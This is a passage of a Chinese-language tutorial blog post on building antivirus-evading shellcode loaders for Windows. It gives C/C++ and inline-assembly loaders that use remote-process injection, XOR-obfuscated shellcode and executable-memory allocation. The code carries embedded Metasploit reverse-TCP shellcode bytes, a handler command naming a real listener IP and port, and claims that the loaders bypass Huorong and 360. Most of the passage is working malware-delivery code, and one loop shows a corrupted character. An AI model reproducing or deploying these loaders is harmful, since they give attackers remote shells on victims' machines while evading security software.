class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ShellCode[] = <span class="string">&quot;shellcode代码&quot;</span>;</span><br><span class="line"><span class="function">BOOL <span class="title">InjectShellCode</span><span class="params">(<span class="type">int</span> Pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE Handle, remoteThread;</span><br><span class="line">    PVOID remoteBuffer;<span class="comment">//shellcode之后会被写入的地址，是一个指针</span></span><br><span class="line">    <span class="comment">//开进程，返回进程句柄，OpenProcess获取访问进程的权限</span></span><br><span class="line">    Handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">    <span class="comment">//申请空间，在指定进程中分配内存，前面的方法是</span></span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(Handle, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(ShellCode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode写入进程内存</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(Handle, remoteBuffer, ShellCode, <span class="built_in">sizeof</span>(ShellCode), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//创建远程线程执行shellcode</span></span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(Handle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(Handle);<span class="comment">//若是关闭的太快会无法上线</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> conv = <span class="built_in">strtol</span>(argv[<span class="number">1</span>], &amp;p, <span class="number">10</span>);<span class="comment">//该函数的意思就是 argv[1]传入参数，该参数中的数字返回到conv，字符串返回给&amp;p指针的位置~~</span></span><br><span class="line"> <span class="comment">//C 库函数 long int strtol(const char *str, char **endptr, int base) 把参数 str 所指向的字符串根据给定的 base 转换为一个长整数（类型为 long int 型），base 必须介于 2 和 36（包含）之间，或者是特殊值 0。</span></span><br><span class="line"> <span class="comment">//str -- 要转换为长整数的字符串。</span></span><br><span class="line"><span class="comment">//endptr -- 对类型为 char* 的对象的引用，其值由函数设置为 str 中数值后的下一个字符。</span></span><br><span class="line"><span class="comment">//base -- 基数，必须介于 2 和 36（包含）之间，或者是特殊值 0。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查错误：例如，输入的是字符串而不是整数，或者输入的整数超过int范围</span></span><br><span class="line">    <span class="keyword">if</span> (errno != <span class="number">0</span> || *p != <span class="string">&#x27;\0&#x27;</span> || conv &gt; INT_MAX || conv &lt; INT_MIN) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pid = conv;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InjectShellCode</span>(pid);<span class="comment">//自定义注入shellcode的函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到clac的进程pid，注入pid，执行程序</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209192021190.png" alt="image-20220919202143656" style="zoom:50%;" /><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">handler -p windows/x64/meterpreter/reverse_tcp -H 124.223.217.243 -P 4321</span><br><span class="line"><span class="comment">#上线msf</span></span><br><span class="line">.\C++loader-5.exe 6448</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209192048569.png" alt="image-20220919204807185" style="zoom:50%;" /><blockquote><p>注意：</p><ul><li>若是关闭线程关闭的太快会导致无法上线，若是注入的进程被关闭，则我们的shell也会被下线。可以注释CloseHandle(Handle);</li><li>另外，这种shellcode直接暴露在代码之中，很容易被杀，所以后面我们可以配合混淆加密，或者是远程加载shellcode的方法进行躲避杀软查杀</li></ul></blockquote><h2 id="C-loader-6"><a href="#C-loader-6" class="headerlink" title="C++loader-6"></a>C++loader-6</h2><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或关键在于，使用两次密钥异或加密处理之后，会还原数据~~</p><p>另外，我们可以不止异或一个值：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a =  b ^ c ====&gt;     b = a ^ c</span><br><span class="line">a = b ^ c ^ d  ====&gt;    b = a ^ c ^ d</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.ruanyifeng.com/blog/2021/01/_xor.html">异或运算 XOR 教程</a></p></blockquote><h3 id="xor异或-VirtualAlloc-CreateThread-x3D-x3D-x3D-x3D-gt-可以免杀逃避火绒和360"><a href="#xor异或-VirtualAlloc-CreateThread-x3D-x3D-x3D-x3D-gt-可以免杀逃避火绒和360" class="headerlink" title="xor异或 + VirtualAlloc + CreateThread&#x3D;&#x3D;&#x3D;&#x3D;&gt;可以免杀逃避火绒和360"></a>xor异或 + VirtualAlloc + CreateThread&#x3D;&#x3D;&#x3D;&#x3D;&gt;可以免杀逃避火绒和360</h3><p>利用xor异或对shellcode进行混淆编码</p><blockquote><p>shellcode_xor.cpp</p><blockquote><ul><li>输出一次异或和两次异或后的shellcode</li><li>配合下面的C++loader-7一起使用</li></ul></blockquote></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span><span class="comment">//循环的将shellcode中的十六进制数据和password进行异或加密~~</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> password = <span class="number">0xAA</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enShellCode[<span class="number">10000</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> deShellCode[<span class="number">10000</span>];</span><br><span class="line">    <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// encode </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        enShellCode[i] = buf[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, enShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// decode</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        deShellCode[i] = enShellCode[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%x&quot;</span>, deShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-loader-7"><a href="#C-loader-7" class="headerlink" title="C++loader-7"></a>C++loader-7</h2><blockquote><ul><li>加载异或后的shellcode，并执行上线，可过火绒和360</li><li>经过混淆的shellcode确实比较好用~~~</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> shellcode_size = <span class="number">0</span>;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;xor异或后的shellcode代码&quot;</span>;</span><br><span class="line">    shellcode_size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// XOR异或</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i��)&#123;</span><br><span class="line">        buf[i] ^= <span class="number">0xAA</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> * shellcode = (<span class="type">char</span> *)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//基址</span></span><br><span class="line">        shellcode_size, <span class="comment">//内存大小</span></span><br><span class="line">        MEM_COMMIT, <span class="comment">//内存页状态</span></span><br><span class="line">        PAGE_EXECUTE_READWRITE  <span class="comment">//可读可写可执行</span></span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    </span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="number">0</span>,  <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="number">0</span>,  <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode,  <span class="comment">// 函数</span></span><br><span class="line">        <span class="number">0</span>,  <span class="comment">// 参数</span></span><br><span class="line">        <span class="number">0</span>,  <span class="comment">// 线程标志</span></span><br><span class="line">        <span class="number">0</span>   <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//一直等待线程执行结束</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread,INFINITE);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="asm-loader-c"><a href="#asm-loader-c" class="headerlink" title="asm_loader_c"></a>asm_loader_c</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x1a\x0a\x7c\x47\x2d\x1c\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">void</span> *exec = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;pushq %1\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;ret\n\t&quot;</span></span><br><span class="line">    :<span class="string">&quot;=r&quot;</span>(b)</span><br><span class="line">    :<span class="string">&quot;r&quot;</span>(exec)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 使用内联汇编插入两条汇编指令</span></span><br><span class="line"><span class="comment">// push 和 ret.push 指令将操作数压入栈顶，然后ret指令将rip指向栈顶</span></span><br><span class="line"><span class="comment">// rip 寄存器：指令指针，指向下一个要执行的指令</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="asm-loader-cpp"><a href="#asm-loader-cpp" class="headerlink" title="asm_loader_cpp"></a>asm_loader_cpp</h2><blockquote><p>该加载器有很多汇编代码</p></blockquote><h3 id="vs-x64-编译"><a href="#vs-x64-编译" class="headerlink" title="vs x64 编译"></a>vs x64 编译</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x28\x03\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4d\x5a\x68\x4e\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x30\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x31\x49\x45\x38\x5f\x76\x31\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x33\x39\x2e\x31\x35\x35\x2e\x34\x39\x2e\x34\x33\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 利用GetProcAddress函数，获取 VirtualAlloc 函数指针的地址</span></span><br><span class="line">    LPVOID lp = <span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> dw_size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line">    <span class="type">void</span>* exec = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 调用virtualalloc的参数从后往前依次压入栈中，最后将VirtualAlloc的函数指针放入eax, 然后call eax。这里VirtualAlloc返回分配的内存指针，返回值放在eax中，然后把eax的值保存到遍历exec里供之后使用</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//VirtualAlloc需要的参数(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></span><br><span class="line">    <span class="comment">//注意：压栈顺序从后往前</span></span><br><span class="line">   <span class="comment">//MOV 指令将源操作数复制到目的操作数。作为数据传送（data transfer）指令，它几乎用在所有程序中。在它的基本格式中，第一个操作数是目的操作数，第二个操作数是源操作数：</span></span><br><span class="line"><span class="comment">//MOV destination,source</span></span><br><span class="line">    __asm<span class="comment">//64位系统会有一点区别</span></span><br><span class="line">    &#123;</span><br><span class="line">        push <span class="number">0x40</span>;</span><br><span class="line">        push <span class="number">0x1000</span>;</span><br><span class="line">        mov eax,dw_size;</span><br><span class="line">        push eax;</span><br><span class="line">        push <span class="number">0</span>;</span><br><span class="line">        mov eax, lp;</span><br><span class="line">        call eax;</span><br><span class="line">        mov exec, eax;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 利用GetProcAddress函数，获取RtlMoveMemory的函数指针</span></span><br><span class="line">    LPVOID op = <span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;RtlMoveMemory&quot;</span>);</span><br><span class="line">    <span class="comment">// 将RtlMoveMemory的参数从后往前依次入栈，最后把RtlMoveMemory的指针放到eax,再call eax</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">    mov eax, dw_size;</span><br><span class="line">    push eax;</span><br><span class="line">    lea eax, buf</span><br><span class="line">    push eax</span><br><span class="line">    mov ecx, exec</span><br><span class="line">    push ecx</span><br><span class="line">    mov eax, op;</span><br><span class="line">    call eax;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 跳转到之前分配的内存中执行</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">    jmp exec;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>C语言函数调用预定：<a href="http://www.pingtaimeng.com/article/detail/id/721649">http://www.pingtaimeng.com/article/detail/id/721649</a></p></blockquote><p>计算机提供了一种被称为栈的数据结构来支持参数传递。</p><p>栈是一种先进后出的数据结构，栈有一个存储区、一个栈顶指针。栈顶指针指向堆栈中第一个可用的数据项（被称为栈顶）。用户可以在栈顶上方向栈中加入数据，这个操作被称为压栈(Push)，压栈以后，栈顶自动变成新加入数据项的位置，栈顶指针也随之修改。用户也可以从堆栈中取走栈顶，称为弹出栈(pop)，弹出栈后，栈顶下的一个元素变成栈顶，栈顶指针随之修改。</p><p>函数调用时，调用者依次把参数压栈，然后调用函数，函数被调用以后，在堆栈中取得数据，并进行计算。函数计算结束以后，或者调用者、或者函数本身修改堆栈，使堆栈恢复原装。</p><h2 id="InjectShellcodeXor（集大成者）"><a href="#InjectShellcodeXor（集大成者）" class="headerlink" title="InjectShellcodeXor（集大成者）"></a>InjectShellcodeXor（集大成者）</h2><blockquote><p>结合了C++loader-5和6，7的特点，本质上是注入进程，再加上将shellcode进行混淆</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span 